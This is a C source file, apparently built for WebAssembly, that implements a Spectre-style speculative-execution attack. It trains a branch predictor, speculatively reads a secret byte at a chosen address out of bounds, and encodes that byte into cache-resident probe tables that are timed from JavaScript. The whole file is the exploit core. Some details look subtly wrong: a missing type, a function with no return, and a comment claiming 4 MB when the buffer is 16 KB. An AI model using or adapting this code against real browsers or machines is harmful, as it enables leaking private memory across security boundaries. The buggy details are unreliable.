#include <stdlib.h>

typedef unsigned char byte;

//  extern void startTimer();
// extern unsigned stopTimer();
extern void _log(unsigned argument);
extern unsigned probeTable(byte* probe_table_address);

byte* secret_table;

byte junk = 0;

byte* getSecretTableAddress() {
    return secret_table;
}

const unsigned TRAINING_CONSTANT = 10;
unsigned training_counter = 0;

byte* initialize() {
    const secret_table_size = 4 << 12;
    secret_table = malloc(secret_table_size); // 4 MB for verfication purposes
    for (unsigned i = 0; i < secret_table_size; ++i) {
        secret_table[i] = (byte) (i % 256); // not exactly uniform
    }
}

byte speculativelyReadAddress(unsigned address, unsigned repetitions, unsigned page_size, unsigned probe_length) {
    byte* valid_access_indicator_array = (byte*) malloc(repetitions * TRAINING_CONSTANT * page_size);
    // _log(valid_access_indicator_array);
    // one valid-dummy space for each iteration (inefficient but simple)
    byte* probe_tables = (byte*) malloc((repetitions * probe_length + 1) * page_size);
    training_counter = 0;
    for (unsigned i = 0; i < repetitions * TRAINING_CONSTANT; ++i) {
        const byte invalid_access = !((i + 1) % TRAINING_CONSTANT);
        const unsigned fixed_index = address & -invalid_access;
        // load condition from RAM so speculative execution gets triggered
        // _log(fixed_index);
        if (~valid_access_indicator_array[i * page_size] & !invalid_access) {
            const byte secret_value = secret_table[fixed_index];
            // _log((secret_value & -invalid_access | !invalid_access << 8) * page_size);
            // map valid accesses to the address (probe_tables)
            // map invalid accesses to their respective probe boxes
            junk ^= probe_tables[(1 + i * probe_length + secret_value) * page_size & -invalid_access];
        }
        // _log(89);
        if (invalid_access) {
            // probe table
            // timing results are stored in JS-land
            byte* probe_table = probe_tables + (1 + training_counter++ * probe_length) * page_size;
            probeTable(probe_table);
        }
    }
    // freeing not possible due to WASM linear memory and FIRST_USE_PARADIGM
    // just reset the current_memory_position without zeroing
    // free(valid_access_indicator_array);
    return junk;
}